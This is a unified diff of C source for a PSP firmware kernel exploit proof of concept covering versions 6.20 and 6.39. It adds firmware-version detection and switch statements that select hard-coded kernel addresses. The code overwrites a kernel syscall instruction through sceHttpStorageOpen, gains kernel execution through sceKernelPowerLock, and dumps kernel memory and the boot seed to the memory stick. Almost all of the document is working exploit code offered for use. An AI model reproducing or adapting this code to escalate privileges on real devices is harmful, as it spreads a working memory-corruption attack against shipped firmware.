@@ -11,8 +11,7 @@
 #include <psppower.h>
 #include <string.h>
 
-PSP_MODULE_INFO("620kxploit", PSP_MODULE_USER, 1, 0);
-//PSP_MODULE_INFO("639kxploit", PSP_MODULE_USER, 1, 0);
+PSP_MODULE_INFO("6.xxKxploit", PSP_MODULE_USER, 1, 0);
 
 /**
  * PSP_THREAD_ATTR_VFPU is mandatory by this exploit
@@ -61,6 +60,8 @@ typedef struct SceModule2
 	unsigned int segmentsize[4]; // 0x90
 } SceModule2;
 
+u32 version = 0;
+
 extern int sceHttpStorageOpen(int a0, int a1, int a2);
 extern int sceKernelPowerLock(unsigned int, unsigned int);
 
@@ -77,42 +78,47 @@ void sync_cache(void)
 }
 
 /** Recovery the instruction we smashed */
-void recovery_sysmem(void)
-{
-	//_sw(0x3C058801, 0x8800CC34); // lui $a1, 0x8801 for 6.39
-	_sw(0x3C058801, 0x8800CCBC);	// lui $a1, 0x8801 for 6.20
+void recovery_sysmem(void) {
+	switch (version) {
+	case 0x620:
+		_sw(0x3C058801, 0x8800CCBC);	// lui $a1, 0x8801 for 6.20
+		break;
+	case 0x639:
+		_sw(0x3C058801, 0x8800CC34);	// lui $a1, 0x8801 for 6.39
+		break;
+	default:
+		break;
+	}
 }
 
 int is_exploited = 0;
 
-int kernel_permission_call(void)
-{
-	void (* _sceKernelIcacheInvalidateAll)(void) = (void *)0x88000E98;
-	void (* _sceKernelDcacheWritebackInvalidateAll)(void) = (void *)0x88000744;
+int kernel_permission_call(void) {
+	void (*_sceKernelIcacheInvalidateAll)(void) = (void *)0x88000E98;
+	void (*_sceKernelDcacheWritebackInvalidateAll)(void) = (void *)0x88000744;
 
 	recovery_sysmem();
 
 	_sceKernelIcacheInvalidateAll();
 	_sceKernelDcacheWritebackInvalidateAll();
 
-	// copy kmem to user
+	/* copy kmem to user */
 	memcpy((void*)0x08A00000, (void*)0x88000000, 0x400000);
-	memcpy((void*)(0x08A00000+0x400000), (void*)0xBFC00200, 0x100);
+	memcpy((void*)(0x08A00000 + 0x400000), (void*)0xBFC00200, 0x100);
 
 	is_exploited = 1;
 
 	return 0;
 }
 
-void do_exploit(void)
-{
+void do_exploit(void) {
 	u32 kernel_entry, entry_addr;
 	u32 interrupts;
 	u32 i;
 	int ret;
 
 	/* Load network libraries */
-	for(i=1; i<=6; ++i) {
+	for (i = 1; i <= 6; ++i) {
 		ret = sceUtilityLoadModule(i + 0xFF);
 		printk("sceUtilityLoadModule 0x%02X -> 0x%08X\n", i + 0xFF, ret);
 	}
@@ -133,8 +139,16 @@ void do_exploit(void)
 	 * Write vsync 0xFFFF(0xFFFFFFFF) to the first instruction of sceKernelPowerLockForUser
 	 * Now the gate to kernel is opened :)
 	 */
-	//ret = sceHttpStorageOpen((0x8800CC34>>2), 0, 0); // scePowerLock override for 6.39
-	ret = sceHttpStorageOpen((0x8800CCBC >> 2), 0, 0); // scePowerLock override for 6.20
+	switch (version) {
+	case 0x620:
+		ret = sceHttpStorageOpen((0x8800CCBC >> 2), 0, 0); // scePowerLock override for 6.20
+		break;
+	case 0x639:
+		ret = sceHttpStorageOpen((0x8800CC34 >> 2), 0, 0); // scePowerLock override for 6.39
+		break;
+	default:
+		break;
+	}
 	printk("sceHttpStorageOpen#2 -> 0x%08X\n", ret);
 	sync_cache();
 
@@ -142,14 +156,22 @@ void do_exploit(void)
 	interrupts = pspSdkDisableInterrupts();
 	kernel_entry = (u32) &kernel_permission_call;
 	entry_addr = ((u32) &kernel_entry) - 16;
-	/* 0x000040F4 is sceKernelPowerLockForUser data offset for 6.39 */
-	//sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F4);
-	/* 0x00004234 is sceKernelPowerLockForUser data offset for 6.20 */
-	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x00004234);
+	switch (version) {
+	case 0x620:
+		/* 0x00004234 is sceKernelPowerLockForUser data offset for 6.20 */
+		sceKernelPowerLock(0, ((u32) &entry_addr) - 0x00004234);
+		break;
+	case 0x639:
+		/* 0x000040F4 is sceKernelPowerLockForUser data offset for 6.39 */
+		sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F4);
+		break;
+	default:
+		break;
+	}
 	pspSdkEnableInterrupts(interrupts);
 
 	/* Unload network libraries */
-	for(i=6; i>=1; --i) {
+	for (i = 6; i >= 1; --i) {
 		ret = sceUtilityUnloadModule(i + 0xFF);
 		printk("sceUtilityUnloadModule 0x%02X -> 0x%08X\n", i + 0xFF, ret);
 	}
@@ -178,27 +200,34 @@ void dump_kmem()
 int main(int argc, char * argv[])
 {
 	pspDebugScreenInit();
-	printk("6.20 kxploit POC by SmikY\n");
+
+	u32 devkit = sceKernelDevkitVersion();
+	version = (((devkit >> 24) & 0xF) << 8) | (((devkit >> 16) & 0xF) << 4) | ((devkit >> 8) & 0xF);
+
+	printk("6.xx kxploit improve POC by SmikY\n");
 	printk("6.39 kxploit POC by liquidzigong\n");
-	printk("originally found by some1\n");
+	printk("originally found (c) by some1\n");
+	printk("You PSP Kernel Version: 0x%X\n", version);
 	printk("Kernel memory will be dumped into ms0:/KMEM.BIN and ms0:/SEED.BIN\n\n");
-
-	do_exploit();
-
-	if(is_exploited) {
-		printk("Exploited! Dumping kmem....\n");
-		dump_kmem();
-	} else {
-		printk("Exploit failed...\n");
-	}
+	printk("Press O start dump memory or X to exit.\n");
 
 	while (1) {
 		SceCtrlData pad;
 		sceCtrlReadBufferPositive(&pad, 1);
 		if (pad.Buttons & PSP_CTRL_CROSS)
 			break;
+		else if (pad.Buttons & PSP_CTRL_CIRCLE) {
+			do_exploit();
+
+			if (is_exploited) {
+				printk("Exploited! Dumping kmem....\n");
+				dump_kmem();
+			} else
+				printk("Exploit failed...\n");
+		}
 		sceKernelDelayThread(10000);
 	}
+
 	printk("Exiting...\n");
 
 	sceKernelDelayThread(1000000);
